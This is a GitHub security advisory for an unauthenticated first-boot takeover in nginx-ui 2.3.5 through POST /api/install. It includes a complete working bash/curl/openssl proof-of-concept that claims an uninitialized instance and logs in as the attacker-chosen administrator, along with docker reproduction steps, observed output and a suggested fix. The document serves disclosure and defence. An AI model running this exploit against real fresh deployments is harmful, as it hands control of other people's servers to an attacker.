# [H] Nginx-UI: Unauthenticated first-boot instance claim via POST /api/install allows remote bootstrap takeover

## Summary
Severity: High
Advisory: GHSA-mxqh-q9h6-v8pq
CVE: CVE-2026-42222
CWE: CWE-284, CWE-306
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-mxqh-q9h6-v8pq
Type: github-advisory

## Affected
- Go: `github.com/0xJacky/nginx-ui` — affected 2.3.5

## Details
## Summary

An unauthenticated bootstrap takeover exists in `nginx-ui` during the initial installation window exposed by `POST /api/install`.

When the instance is still uninitialized, `POST /api/install` is reachable without authentication and accepts attacker-controlled bootstrap data. The handler sets the application's JWT secret, the node secret, the certificate email, and the initial administrator username and password. This allows an attacker who can reach a fresh instance during the initial 10-minute setup window to claim the installation before the legitimate operator.

This is not a general post-install takeover. The exposure condition is narrower: the target must still be in its first-run state and still be within the initial setup window. In practice, this makes the issue most relevant during initial deployment, rebuilds, ephemeral test environments, LAN-accessible fresh installs, or temporarily exposed setup workflows.

The primary attack path is direct network access to a reachable fresh instance.[^cors]

This was reproduced over HTTP against live local instances started from `nginx-ui` `v2.3.5` using Docker image `uozi/nginx-ui@sha256:d73343e3009c9b558129a2be0cacd6c2c57ed8006a5871873b874b812e612e5a` (`org.opencontainers.image.version=2.3.5`, revision `1a9cd29a308278173aa0f16234cb78061dd2bd42`).

## Impact

This issue allows full unauthenticated takeover of a fresh `nginx-ui` instance during the initial installation window.

The practical exposure window is limited, but the impact inside that window is complete administrative takeover. An attacker does not need to guess defaults or exploit an authenticated feature; they become the first administrator and define the instance trust material themselves.

In live testing, the attacker was able to:

- confirm that the target was still uninitialized
- submit attacker-chosen bootstrap credentials
- lock the installation under attacker control
- immediately authenticate as the newly set administrator

Observed values during live reproduction included:

```text
INSTALL_BEFORE={"lock":false,"timeout":false}
INSTALL_POST={"message":"ok"}
INSTALL_AFTER={"lock":true,"timeout":false}
LOGIN_RESPONSE={"message":"ok","code":200,...,"short_token":"qIJAE3dQMm3afhaV"}
```

Because the bootstrap request also initializes the application's trust material, this is more severe than a simple default-admin issue. An attacker does not merely guess credentials; they define the initial administrator account and application secrets themselves.

## PoC

The following standalone PoC is sufficient to reproduce the issue without relying on any repository-local helper script. It requires only `bash`, `curl`, and `openssl`.

Standalone PoC:

```bash
#!/usr/bin/env bash
set -euo pipefail

base_url="http://127.0.0.1:9000"
email="poc2@nginxui.test"
username="pocverify2"
password="Passw0rd123"

tmpdir="$(mktemp -d)"
trap 'rm -rf "$tmpdir"' EXIT

install_before="$(curl -fsS "${base_url}/api/install")"
printf 'INSTALL_BEFORE=%s\n' "$install_before"

key_json="$(curl -fsS \
  -H 'Content-Type: application/json' \
  --data "{\"timestamp\":$(date +%s),\"fingerprint\":\"install-takeover-poc\"}" \
  "${base_url}/api/crypto/public_key")"

key_escaped="$(printf '%s' "$key_json" | sed -n 's/.*"public_key":"\(.*\)","request_id".*/\1/p')"
printf '%b' "$key_escaped" > "${tmpdir}/public_key.pem"
openssl rsa -RSAPublicKey_in -in "${tmpdir}/public_key.pem" -pubout -out "${tmpdir}/public_key_spki.pem" >/dev/null 2>&1

printf '{"email":"%s","username":"%s","password":"%s"}' "$email" "$username" "$password" > "${tmpdir}/install.json"
encrypted_install="$(
  openssl pkeyutl -encrypt -pubin -inkey "${tmpdir}/public_key_spki.pem" -pkeyopt rsa_padding_mode:pkcs1 -in "${tmpdir}/install.json" \
  | openssl base64 -A
)"

install_post="$(curl -fsS \
  -H 'Content-Type: application/json' \
  --data "{\"encrypted_params\":\"${encrypted_install}\"}" \
  "${base_url}/api/install")"
printf 'INSTALL_POST=%s\n' "$install_post"

install_after="$(curl -fsS "${base_url}/api/install")"
printf 'INSTALL_AFTER=%s\n' "$install_after"

printf '{"name":"%s","password":"%s","otp":"","recovery_code":""}' "$username" "$password" > "${tmpdir}/login.json"
encrypted_login="$(
  openssl pkeyutl -encrypt -pubin -inkey "${tmpdir}/public_key_spki.pem" -pkeyopt rsa_padding_mode:pkcs1 -in "${tmpdir}/login.json" \
  | openssl base64 -A
)"

login_response="$(curl -fsS \
  -H 'Content-Type: application/json' \
  --data "{\"encrypted_params\":\"${encrypted_login}\"}" \
  "${base_url}/api/login")"
printf 'LOGIN_RESPONSE=%s\n' "$login_response"
```

Observed output during live verification:

```text
INSTALL_BEFORE={"lock":false,"timeout":false}
INSTALL_POST={"message":"ok"}
INSTALL_AFTER={"lock":true,"timeout":false}
LOGIN_RESPONSE={"message":"ok","code":200,"token":"<redacted>","short_token":"qIJAE3dQMm3afhaV"}
```

## Steps to Reproduce

1. Start a fresh local `nginx-ui` `v2.3.5` instance from the tested Docker image digest with empty `/etc/nginx` and `/etc/nginx-ui` directories.

```bash
mkdir -p .tmp/poc-nginx .tmp/poc-nginx-ui

docker run -d --rm --name nginx-ui-poc \
  -v "$PWD/.tmp/poc-nginx:/etc/nginx" \
  -v "$PWD/.tmp/poc-nginx-ui:/etc/nginx-ui" \
  uozi/nginx-ui@sha256:d73343e3009c9b558129a2be0cacd6c2c57ed8006a5871873b874b812e612e5a
```

2. Save the standalone PoC above as a shell script and execute it against the internal HTTP listener, or run the equivalent commands directly inside the container with:

```bash
docker exec -it nginx-ui-poc bash
```

Then set `base_url` to `http://127.0.0.1:9000` and run the standalone PoC.

3. Observe the output.

Actual result:

- `GET /api/install` returns `{"lock":false,"timeout":false}`
- `POST /api/install` returns `{"message":"ok"}`
- a follow-up `GET /api/install` returns `{"lock":true,"timeout":false}`
- `POST /api/login` succeeds with the attacker-chosen username and password and returns a valid token

Expected result:

- arbitrary remote clients should never be able to complete bootstrap without a host-local or out-of-band secret
- `POST /api/install` should be rejected unless the request carries a valid host-local or out-of-band bootstrap authorization factor
- attacker-chosen bootstrap credentials and application secrets should never be accepted from arbitrary remote clients during first-run setup

## Suggested Fix

1. Remove remote unauthenticated installation as a security boundary. Do not rely on a 10-minute time window for protection.

2. Require a local-only or out-of-band bootstrap secret for `POST /api/install`, for example:
- generate a one-time setup token at startup
- print or store it locally on the host
- require that token to complete initialization

3. Bind initial setup to loopback by default, or otherwise explicitly restrict first-run setup to trusted local access paths.

4. Remove the pre-install unauthenticated exception from other sensitive setup-adjacent routes such as `/api/self_check` and `/api/restore`.

5. As defense in depth, narrow CORS on setup endpoints. `POST /api/install` should not be callable cross-origin by arbitrary websites.

6. Add regression tests covering:
- unauthenticated remote `POST /api/install` being rejected by default
- no installation claim without a valid bootstrap secret
- `/api/self_check` and `/api/restore` requiring authentication
- no cross-origin installation via browser preflight and JSON POST

[^cors]: In live testing, `OPTIONS /api/install` returned `Access-Control-Allow-Origin: *`. That may enable browser-assisted exploitation in some deployment layouts, but it is not required for exploitation and is not the primary path.

## References
- https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-mxqh-q9h6-v8pq
- https://nvd.nist.gov/vuln/detail/CVE-2026-42222
- https://github.com/0xJacky/nginx-ui
